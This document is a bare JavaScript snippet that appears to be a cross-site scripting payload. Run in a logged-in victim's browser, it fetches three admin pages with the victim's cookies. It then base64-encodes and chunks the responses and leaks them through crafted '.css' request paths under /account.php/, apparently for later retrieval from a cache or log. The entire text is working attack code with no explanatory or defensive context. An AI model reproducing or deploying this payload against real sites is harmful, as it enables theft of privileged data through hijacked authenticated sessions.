(function(){
  var UNIQ = "r9x2q";
  var CHUNK = 80;
  function exfil(tag, text) {
    var enc = btoa(unescape(encodeURIComponent(text)));
    var parts = [];
    for (var i = 0; i < enc.length; i += CHUNK) {
      parts.push(enc.slice(i, i + CHUNK));
    }
    parts.forEach(function(p, i) {
      var safe = p.replace(/\+/g,'_').replace(/\//g,'-').replace(/=/g,'.');
      fetch("/account.php/" + UNIQ + "_" + tag + "_" + i + "_" + safe + ".css",
            {credentials:"include"}).catch(function(){});
    });
  }
  Promise.all([
    fetch("/admin/", {credentials:"include"}).then(function(r){return r.text();}),
    fetch("/admin/review.php", {credentials:"include"}).then(function(r){return r.text();}),
    fetch("/admin/search.php", {credentials:"include"}).then(function(r){return r.text();})
  ]).then(function(pages) {
    exfil("ov", pages[0]);
    exfil("rv", pages[1]);
    exfil("sr", pages[2]);
  }).catch(function(e){
    exfil("err", e.toString());
  });
})();
